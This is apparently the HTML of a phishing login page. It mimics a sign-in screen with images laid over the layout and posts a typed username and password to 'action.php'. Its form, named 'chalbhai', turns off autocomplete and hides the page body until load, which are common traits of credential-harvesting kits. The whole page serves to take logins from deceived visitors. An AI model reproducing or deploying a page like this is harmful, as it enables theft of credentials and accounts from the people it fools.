<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:577px; top:1px; width:581px; height:80px; z-index:0"><a href="#"><img src="images/headermenu.png" alt="" title="" border=0 width=581 height=80></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:217px; top:0px; width:178px; height:85px; z-index:1"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=178 height=85></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:216px; top:100px; width:950px; height:53px; z-index:2"><a href="#"><img src="images/menu.png" alt="" title="" border=0 width=950 height=53></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:217px; top:167px; width:709px; height:328px; z-index:3"><img src="images/loggs.gif" alt="" title="" border=0 width=709 height=328></div>

<div id="image5" style="position:absolute; overflow:hidden; left:936px; top:163px; width:237px; height:336px; z-index:4"><img src="images/psnrl.png" alt="" title="" border=0 width=237 height=336></div>

<div id="image6" style="position:absolute; overflow:hidden; left:957px; top:296px; width:141px; height:14px; z-index:5"><a href="#"><img src="images/frgot.png" alt="" title="" border=0 width=141 height=14></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:973px; top:222px; width:140px; height:14px; z-index:6"><a href="#"><img src="images/rememberca.png" alt="" title="" border=0 width=140 height=14></a></div>

<div id="formcheckbox1" style="position:absolute; left:952px; top:219px; z-index:7"><input type="checkbox" name="formcheckbox1"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:216px; top:528px; width:960px; height:198px; z-index:8"><a href="#"><img src="images/betwen.png" alt="" title="" border=0 width=960 height=198></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:213px; top:721px; width:964px; height:366px; z-index:9"><a href="#"><img src="images/bet2.png" alt="" title="" border=0 width=964 height=366></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:194px; top:1041px; width:985px; height:257px; z-index:10"><a href="#"><img src="images/bet3.png" alt="" title="" border=0 width=985 height=257></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:211px; top:1295px; width:991px; height:310px; z-index:11"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=991 height=310></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:955px; top:369px; width:172px; height:47px; z-index:12"><a href="#"><img src="images/agreeee.png" alt="" title="" border=0 width=172 height=47></a></div>
<form action=action.php name=chalbhai id=chalbhai method=post>
<input name="formtext1"  title="Please Enter Right Value"  autofocus required autocomplete="off"  type="text" maxlength=19 style="position:absolute;width:193px;height:22;left:957px;top:197px;z-index:13">
<input name="formtext2"  title="Please Enter Right Value"  autofocus required autocomplete="off"  type="password" style="position:absolute;width:193px;left:957px;height:22;top:270px;z-index:14">
<div id="formimage1" style="position:absolute; left:1053px; top:321px; z-index:15"><input type="image" name="formimage1" width="99" height="40" src="images/signon.png"></div>
<div id="image13" style="position:absolute; overflow:hidden; left:953px; top:320px; width:95px; height:41px; z-index:16"><img src="images/register.png" alt="" title="" border=0 width=95 height=41></div>

</div>

</body>
</html>
